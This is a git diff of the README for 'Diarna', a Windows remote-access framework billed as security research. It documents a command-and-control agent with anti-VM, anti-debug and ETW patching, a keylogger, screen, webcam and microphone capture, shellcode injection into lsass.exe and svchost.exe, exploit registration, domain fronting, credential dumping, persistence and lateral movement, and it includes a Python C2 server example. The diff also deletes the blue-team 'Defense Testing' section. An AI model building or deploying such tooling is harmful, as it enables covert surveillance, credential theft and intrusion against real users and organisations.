@@ -3,7 +3,7 @@
 > Windows security research framework. C++20.
 > Compiles with MSVC, MinGW-w64, and Clang.
 
-⚠️ **Authorized security testing only.**
+**Authorized security testing only.**
 
 ---
 
@@ -28,13 +28,13 @@ int main() {
     diarna::AgentConfig cfg;
     cfg.agent_id   = "research-001";
     cfg.c2_host    = "10.0.0.50";
-    cfg.c2_port    = 4443;              // NOT 4444 — use a random port
+    cfg.c2_port    = 4443;              // up to you, should've added domain -> host
     cfg.encryption_key = {
         0x3a,0x91,0xf4,0x2c,0x8d,0x17,0xe6,0x55,
         0xb0,0x29,0x4f,0xae,0x73,0x1d,0xc8,0x62,
         0x94,0x0b,0xd3,0x5e,0xf7,0x28,0x41,0xac,
         0x86,0x59,0xee,0x1b,0x7f,0x34,0xd0,0xa2
-    };
+    };//id have something generate different encryption keys per client for server to know
     cfg.anti_vm       = true;
     cfg.anti_debug    = true;
     cfg.patch_etw     = true;
@@ -46,7 +46,6 @@ int main() {
     if (!agent.arm())   return 1;   // environment checks + stealth
     if (!agent.deploy()) return 1;  // persistence + collectors
 
-    // ── Use subsystems ──
     auto scr = agent.screenshot().capture_jpeg(85);
     auto keys = agent.keylogger().get_logs();
     auto result = agent.exec().execute("whoami");
@@ -82,7 +81,7 @@ cmake -B build -G "Unix Makefiles" -DCMAKE_SYSTEM_NAME=Windows \
 | `encryption_key` | uint8[32] | (required) | ChaCha20-Poly1305 32-byte key |
 | `tor_enabled` | bool | false | Route traffic through embedded Tor client |
 | `domain_fronting` | bool | false | Route through CDN (Cloudflare, Azure) |
-| `cdn_front` | string | "" | CDN edge domain (e.g., `cdn.cloudflare.net`) |
+| `cdn_front` | string | "" | CDN edge domain for spoofing (e.g., `cdn.cloudflare.net`) |
 | `cdn_host` | string | "" | Real C2 hostname (Host header) |
 | `anti_vm` | bool | true | Check for VMware, VirtualBox, Hyper-V, QEMU, etc. |
 | `anti_debug` | bool | true | Check for debuggers (x64dbg, IDA, WinDbg, etc.) |
@@ -170,7 +169,7 @@ mic.start_capture(44100, 2, [](auto wav_chunk) {
 });
 mic.stop_capture();
 
-auto devices = Audio::enumerate_devices(); // List microphones
+auto devices = Audio::enumerate_devices(); // list microphones
 ```
 
 ### `agent.webcam()` — Webcam Capture
@@ -317,8 +316,8 @@ shell.stop();
 ```cpp
 auto& si = agent.stubs();
 
-// Inject shellcode into a signed Microsoft process
-uint8_t my_stub[] = { 0x90, 0x90, 0xC3 }; // NOP; NOP; RET
+// inject shellcode into a signed Microsoft process
+uint8_t my_stub[] = { 0x90, 0x90, 0xC3 }; // NOP; NOP; RET (you can extend the framework's code into the process)
 si.inject_into_process(L"explorer.exe", my_stub);
 si.inject_into_process(L"svchost.exe", my_stub);
 si.inject_into_process(L"lsass.exe", my_stub);
@@ -336,10 +335,10 @@ si.remove_all();                 // clean up
 ```cpp
 auto& exp = agent.exploits();
 
-// Register a pre-compiled exploit
+// add a pre-compiled exploit
 exp.register_exploit(
     "LPE-001",                   // name
-    "CVE-2026-12345",            // CVE
+    "CVE-2026-12345",            // CVE (u can put random stuff here)
     shellcode_payload,           // pre-compiled byte array
     "10.0.19041-10.0.22621",    // target OS build range
     false,                        // needs admin? false = privesc
@@ -348,7 +347,7 @@ exp.register_exploit(
 
 // Execute by name
 exp.execute("LPE-001", { .run_as_system = true });
-
+/* OR */
 // Execute all registered exploits
 exp.execute_all();
 
@@ -377,12 +376,12 @@ auto s = agent.status();
 ```
 Diarna/
 ├── include/
-│   ├── diarna.h                     ← SINGLE INCLUDE convenience layer
+│   ├── diarna.h                     <- unified API to include & use
 │   └── diarna/
-│       ├── compiler_port.hpp        Cross-compiler abstraction (MSVC ∥ MinGW)
+│       ├── compiler_port.hpp        Cross-compiler abstraction (MSVC & MinGW)
 │       ├── core/
 │       │   ├── config.hpp           All configuration structs
-│       │   └── framework.hpp        Orchestrator (arm → deploy → main_loop)
+│       │   └── framework.hpp        Orchestrator (arm then deploy & then main_loop)
 │       ├── crypto/
 │       │   └── chacha20.hpp         ChaCha20-Poly1305 AEAD (zero deps)
 │       ├── stealth/
@@ -439,7 +438,7 @@ Every message is framed as:
 │ (derived from  │ = 2      │ see below   │         │              │        │        │
 │  agent_id+key) │          │             │         │              │        │        │
 └────────────────┴──────────┴─────────────┴─────────┴──────────────┴────────┴────────┘
-│←── 21 byte header ──→│←── payload (payload_sz bytes) ──→│
+│←── 21 byte header ──->│←── payload (payload_sz bytes) ──->│
 ```
 
 ### 3. Encrypt/Decrypt
@@ -450,45 +449,45 @@ Every message body is encrypted with **ChaCha20-Poly1305 AEAD** using the same 3
 
 | Command | Value | Direction | What it sends |
 |---------|-------|-----------|---------------|
-| `CMD_EXEC` | 0x0100 | S→C | Run command via cmd.exe |
-| `CMD_EXEC_PS` | 0x0101 | S→C | Run PowerShell script |
-| `CMD_EXEC_SHELLCODE` | 0x0102 | S→C | Execute raw shellcode |
-| `CMD_EXEC_DLL` | 0x0103 | S→C | Load and run a DLL export |
-| `CMD_FS_LIST` | 0x0200 | S→C | List directory |
-| `CMD_FS_READ` | 0x0201 | S→C | Read file |
-| `CMD_FS_WRITE` | 0x0202 | S→C | Write file |
-| `CMD_FS_DELETE` | 0x0203 | S→C | Delete file |
-| `CMD_FS_DOWNLOAD` | 0x0204 | S→C | Download from URL to disk |
-| `CMD_FS_UPLOAD` | 0x0205 | S→C | Upload local file to URL |
-| `CMD_SCREENSHOT` | 0x0300 | S→C | Capture screenshot |
-| `CMD_AUDIO` | 0x0301 | S→C | Record audio |
-| `CMD_WEBCAM` | 0x0302 | S→C | Capture webcam frame |
-| `CMD_DESKTOP_STREAM` | 0x0303 | S→C | Start desktop stream |
-| `CMD_STOP_STREAM` | 0x0304 | S→C | Stop desktop stream |
-| `CMD_KEYLOG` | 0x0400 | S→C | Dump keystroke logs |
-| `CMD_CLIPBOARD` | 0x0401 | S→C | Dump clipboard history |
-| `CMD_CREDS` | 0x0402 | S→C | Dump credentials |
-| `CMD_PERSIST` | 0x0500 | S→C | Install persistence |
-| `CMD_PERSIST_REMOVE` | 0x0501 | S→C | Remove persistence |
-| `CMD_PERSIST_STATUS` | 0x0502 | S→C | Check persistence status |
-| `CMD_INJECT` | 0x0600 | S→C | Inject shellcode |
-| `CMD_INJECT_DLL` | 0x0601 | S→C | Inject DLL |
-| `CMD_HOLLOW` | 0x0602 | S→C | Process hollowing |
-| `CMD_NET_SCAN` | 0x0700 | S→C | Scan network |
-| `CMD_WMI_EXEC` | 0x0701 | S→C | WMI remote exec |
-| `CMD_PSX_EXEC` | 0x0702 | S→C | PsExec remote exec |
-| `CMD_WINRM_EXEC` | 0x0703 | S→C | WinRM remote exec |
-| `CMD_SYSINFO` | 0x0800 | S→C | Get system info |
-| `CMD_SELF_DESTRUCT` | 0x0801 | S→C | Uninstall + self-delete |
-| `CMD_SLEEP` | 0x0803 | S→C | Sleep N seconds |
-| `CMD_RESPONSE` | 0x8000 | C→S | Client response |
-| `CMD_ERROR` | 0xFFFF | C→S | Error response |
+| `CMD_EXEC` | 0x0100 | S->C | Run command via cmd.exe |
+| `CMD_EXEC_PS` | 0x0101 | S->C | Run PowerShell script |
+| `CMD_EXEC_SHELLCODE` | 0x0102 | S->C | Execute raw shellcode |
+| `CMD_EXEC_DLL` | 0x0103 | S->C | Load and run a DLL export |
+| `CMD_FS_LIST` | 0x0200 | S->C | List directory |
+| `CMD_FS_READ` | 0x0201 | S->C | Read file |
+| `CMD_FS_WRITE` | 0x0202 | S->C | Write file |
+| `CMD_FS_DELETE` | 0x0203 | S->C | Delete file |
+| `CMD_FS_DOWNLOAD` | 0x0204 | S->C | Download from URL to disk |
+| `CMD_FS_UPLOAD` | 0x0205 | S->C | Upload local file to URL |
+| `CMD_SCREENSHOT` | 0x0300 | S->C | Capture screenshot |
+| `CMD_AUDIO` | 0x0301 | S->C | Record audio |
+| `CMD_WEBCAM` | 0x0302 | S->C | Capture webcam frame |
+| `CMD_DESKTOP_STREAM` | 0x0303 | S->C | Start desktop stream |
+| `CMD_STOP_STREAM` | 0x0304 | S->C | Stop desktop stream |
+| `CMD_KEYLOG` | 0x0400 | S->C | Dump keystroke logs |
+| `CMD_CLIPBOARD` | 0x0401 | S->C | Dump clipboard history |
+| `CMD_CREDS` | 0x0402 | S->C | Dump credentials |
+| `CMD_PERSIST` | 0x0500 | S->C | Install persistence |
+| `CMD_PERSIST_REMOVE` | 0x0501 | S->C | Remove persistence |
+| `CMD_PERSIST_STATUS` | 0x0502 | S->C | Check persistence status |
+| `CMD_INJECT` | 0x0600 | S->C | Inject shellcode |
+| `CMD_INJECT_DLL` | 0x0601 | S->C | Inject DLL |
+| `CMD_HOLLOW` | 0x0602 | S->C | Process hollowing |
+| `CMD_NET_SCAN` | 0x0700 | S->C | Scan network |
+| `CMD_WMI_EXEC` | 0x0701 | S->C | WMI remote exec |
+| `CMD_PSX_EXEC` | 0x0702 | S->C | PsExec remote exec |
+| `CMD_WINRM_EXEC` | 0x0703 | S->C | WinRM remote exec |
+| `CMD_SYSINFO` | 0x0800 | S->C | Get system info |
+| `CMD_SELF_DESTRUCT` | 0x0801 | S->C | Uninstall + self-delete |
+| `CMD_SLEEP` | 0x0803 | S->C | Sleep N seconds |
+| `CMD_RESPONSE` | 0x8000 | C->S | Client response |
+| `CMD_ERROR` | 0xFFFF | C->S | Error response |
 
 ### 5. Python Server Example
 
 ```python
 import socket, struct
-from chacha20poly1305 import ChaCha20Poly1305  # pip install
+from chacha20poly1305 import ChaCha20Poly1305
 
 KEY = bytes.fromhex("3a91f42c8d17e655b0294fae731dc862940bd35ef72841ac8659ee1b7f34d0a2")
 FRAME_HDR = struct.Struct("<I H H I I I B")
@@ -533,6 +532,8 @@ print(info.decode())
 | `INDIRECT_BRANCHING` | 1 | Anti-decompiler `xor eax,eax; jz; .byte 0x00` |
 | `OBF_UNSUPPORTED` | — | Bypass unsupported-compiler check |
 
+Credit: @ac3ss0r for Obfusheader.h
+
 ---
 
 ## Keylogger Detail
@@ -543,8 +544,8 @@ keyboard hook. This runs in a dedicated thread with a Windows message pump.
 **Character mapping pipeline:**
 1. `keyboard_proc` receives WM_KEYDOWN/WM_SYSKEYDOWN
 2. Modifier state (Shift/Ctrl/Alt) is read via `GetAsyncKeyState`
-3. Virtual key → character via `ToUnicode` + keyboard state
-4. Special keys tagged: [BK], [DEL], [ESC], ←↑→↓, [CTRL+C/V], [ALT+TAB]
+3. Virtual key -> character via `ToUnicode` + keyboard state
+4. Special keys tagged: [BK], [DEL], [ESC], ←↑->↓, [CTRL+C/V], [ALT+TAB]
 5. Foreground window title tracked via `GetForegroundWindow`
 6. On window change OR 30-second timeout: flush to log buffer
 
@@ -554,19 +555,6 @@ keyboard hook. This runs in a dedicated thread with a Windows message pump.
 [chrome.exe] https://github.com/login[TAB]user@email.com[TAB]password123[RETURN]
 [notepad++.exe] confidential document[CTRL+S]
 ```
-
----
-
-## Defense Testing
-
-Blue teams can use Diarna to validate detection rules:
-
-1. **Compile with default settings** — run through your EDR, check which modules trigger alerts
-2. **Enable `survive_reboot`** — verify your persistence monitoring (Sysmon Event 12/13, service creation events)
-3. **Enable `keylogger`** — verify your hook detection (`SetWindowsHookEx` monitoring)
-4. **Enable `wifi_dump`** — verify your credential access monitoring
-5. **Deploy with all evasion disabled** — baseline what your stack catches
-6. **Deploy with all evasion enabled** — test if your stack still catches the modified binary
 
 ---
 
